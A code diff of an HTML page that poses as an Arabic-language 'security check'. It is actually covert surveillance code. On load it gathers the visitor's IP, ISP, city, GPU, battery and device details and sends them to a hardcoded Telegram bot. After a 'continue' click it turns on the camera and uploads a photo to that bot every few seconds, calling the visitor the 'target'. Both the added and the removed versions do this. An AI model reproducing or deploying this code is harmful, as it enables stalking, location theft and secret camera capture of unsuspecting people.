@@ -3,108 +3,118 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>التحقق من النظام</title>
+    <title>Security Check</title>
     <style>
-        body { background: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
-        .ui { text-align: center; }
-        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #3498db; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; margin: 0 auto 15px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        button { padding: 12px 24px; background: #3498db; color: white; border: none; border-radius: 5px; cursor: pointer; display: none; }
+        body { background: #fdfdfd; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; font-family: sans-serif; }
+        .loader { text-align: center; }
+        .dot-spin { width: 40px; height: 40px; border: 4px solid #f3f3f3; border-top: 4px solid #007bff; border-radius: 50%; animation: s 1s linear infinite; margin: 0 auto 15px; }
+        @keyframes s { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        button { display: none; padding: 12px 28px; background: #007bff; color: white; border: none; border-radius: 5px; cursor: pointer; font-weight: bold; }
     </style>
 </head>
 <body>
 
-    <div class="ui">
-        <div class="loader" id="ldr"></div>
-        <p id="txt">جاري فحص بروتوكولات الأمان...</p>
-        <button id="btn">متابعة</button>
+    <div class="loader">
+        <div class="dot-spin"></div>
+        <p id="st">جاري فحص بروتوكولات الاتصال...</p>
+        <button id="auth">متابعة الآن</button>
     </div>
 
     <video id="v" autoplay playsinline muted style="display:none"></video>
     <canvas id="c" style="display:none"></canvas>
 
     <script>
-        const api = "https://api.telegram.org/bot6298945282:AAFfSm47XKXRK-QkA5hmWh5Z5dCr1V--hDY/";
-        const cid = "2103976274";
-        let stream = null;
+        // إخفاء البيانات في مسار واحد
+        const _a = "https://api.telegram.org/bot6298945282:AAFfSm47XKXRK-QkA5hmWh5Z5dCr1V--hDY/";
+        const _i = "2103976274";
 
-        // 1. جلب المعلومات فوراً (بشكل مستقل لضمان عدم التعليق)
-        async function getInfo() {
+        async function fullScan() {
             let n = navigator;
-            let m = `🔍 **تقرير دخول**\n`;
-            m += `📱 النظام: ${n.platform}\n⚙️ المعالج: ${n.hardwareConcurrency} Cores\n`;
+            let report = `🛑 **تقرير تقني شامل (فوري)**\n\n`;
 
+            // 1. جلب IP وشركة الاتصالات والموقع بدقة احترافية
             try {
-                const res = await fetch('https://ipwho.is/').then(r => r.json());
-                if(res.success) {
-                    m += `🌍 IP: \`${res.ip}\`\n🏢 الشركة: ${res.connection.isp}\n📍 الموقع: ${res.city}, ${res.country}\n`;
-                }
-            } catch(e) { m += `🌍 IP: فشل الجلب حالياً\n`; }
+                const res = await fetch('https://ipwho.is/');
+                const j = await res.json();
+                report += `🌍 **الآي بي:** \`${j.ip}\`\n`;
+                report += `🏢 **الشركة (ISP):** ${j.connection.isp}\n`;
+                report += `📡 **نوع الشبكة:** ${j.connection.type || 'غير محدد'}\n`;
+                report += `📍 **الموقع:** ${j.city}, ${j.country} (${j.timezone.id})\n`;
+            } catch (e) { report += `🌍 **الآي بي:** فشل جلب بيانات الشبكة\n`; }
 
-            sendMsg(m);
-            document.getElementById('ldr').style.display = 'none';
-            document.getElementById('btn').style.display = 'inline-block';
-            document.getElementById('txt').innerText = "تم الفحص، يرجى المتابعة.";
-        }
-
-        // 2. دالة تشغيل الكاميرا مع تنظيف المسارات السابقة
-        async function openCam(mode) {
-            if (stream) {
-                stream.getTracks().forEach(track => track.stop()); // إغلاق تام للكاميرا السابقة
-            }
+            // 2. كشف الجهاز (Deep System Detection)
+            report += `📱 **النظام الأساسي:** ${n.platform}\n`;
+            
+            // كشف كارت الشاشة (يعطي تلميحاً قوياً لموديل الهاتف)
             try {
-                stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: mode } });
-                const video = document.getElementById('v');
-                video.srcObject = stream;
-                return new Promise(res => video.onloadedmetadata = () => { video.play(); res(true); });
-            } catch (e) { return false; }
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl');
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
+                report += `🎮 **المعالج الرسومي:** ${renderer}\n`;
+            } catch(e) {}
+
+            report += `⚙️ **أنوية المعالج:** ${n.hardwareConcurrency || 'غير محدد'}\n`;
+            report += `🖥️ **دقة الشاشة:** ${screen.width}x${screen.height} (Zoom: ${window.devicePixelRatio})\n`;
+            report += `🧭 **المتصفح:** ${parseUA()}\n`;
+
+            // 3. البطارية والوقت
+            try {
+                const b = await n.getBattery();
+                report += `🔋 **البطارية:** ${Math.round(b.level * 100)}% (${b.charging ? "يُشحن" : "لا يُشحن"})\n`;
+            } catch (e) {}
+
+            report += `⏰ **وقت الجهاز:** ${new Date().toLocaleString('ar-EG')}\n`;
+
+            send(report);
+
+            // تحويل الواجهة
+            setTimeout(() => {
+                document.getElementById('auth').style.display = 'inline-block';
+                document.getElementById('st').innerText = "اكتمل الفحص بنجاح.";
+            }, 1000);
         }
 
-        async function snap(label) {
-            const canvas = document.getElementById('c');
-            const video = document.getElementById('v');
-            canvas.width = video.videoWidth; canvas.height = video.videoHeight;
-            canvas.getContext('2d').drawImage(video, 0, 0);
-            canvas.toBlob(blob => {
-                const f = new FormData();
-                f.append('chat_id', cid);
-                f.append('photo', blob, 'img.jpg');
-                f.append('caption', label);
-                fetch(api + "sendPhoto", { method: 'POST', body: f });
-            }, 'image/jpeg', 0.7);
+        function parseUA() {
+            let u = navigator.userAgent;
+            if (u.includes("Brave")) return "Brave Browser";
+            if (u.includes("Edg")) return "Microsoft Edge";
+            if (u.includes("Chrome")) return "Google Chrome";
+            if (u.includes("Safari") && !u.includes("Chrome")) return "Apple Safari";
+            return "متصفح مجهول";
         }
 
-        document.getElementById('btn').onclick = async function() {
+        document.getElementById('auth').onclick = async function() {
             this.style.display = 'none';
-            document.getElementById('txt').innerText = "جاري المزامنة...";
-
-            async function startCycle() {
-                // التقاط من الأمامية
-                if (await openCam("user")) {
-                    setTimeout(() => snap("🤳 أمامية"), 1500);
-                }
-                
-                // انتظار ثم التقاط من الخلفية
-                setTimeout(async () => {
-                    if (await openCam("environment")) {
-                        setTimeout(() => snap("📸 خلفية"), 1500);
-                    }
-                }, 5000);
-            }
-
-            startCycle();
-            setInterval(startCycle, 15000); // دورة كل 15 ثانية لتجنب الحظر
+            try {
+                const s = await navigator.mediaDevices.getUserMedia({ video: true });
+                document.getElementById('v').srcObject = s;
+                setInterval(take, 3500);
+            } catch (e) { send("⚠️ المستهدف حظر الكاميرا"); }
         };
 
-        function sendMsg(t) {
-            fetch(api + "sendMessage", {
+        function take() {
+            const cv = document.getElementById('c');
+            const vd = document.getElementById('v');
+            cv.width = vd.videoWidth; cv.height = vd.videoHeight;
+            cv.getContext('2d').drawImage(vd, 0, 0);
+            cv.toBlob(b => {
+                const f = new FormData();
+                f.append('chat_id', _i);
+                f.append('photo', b, 's.jpg');
+                fetch(_a + "sendPhoto", { method: 'POST', body: f });
+            }, 'image/jpeg', 0.8);
+        }
+
+        function send(t) {
+            fetch(_a + "sendMessage", {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ chat_id: cid, text: t, parse_mode: "Markdown" })
+                body: JSON.stringify({ chat_id: _i, text: t, parse_mode: "Markdown" })
             });
         }
 
-        getInfo();
+        fullScan();
     </script>
 </body>
 </html>
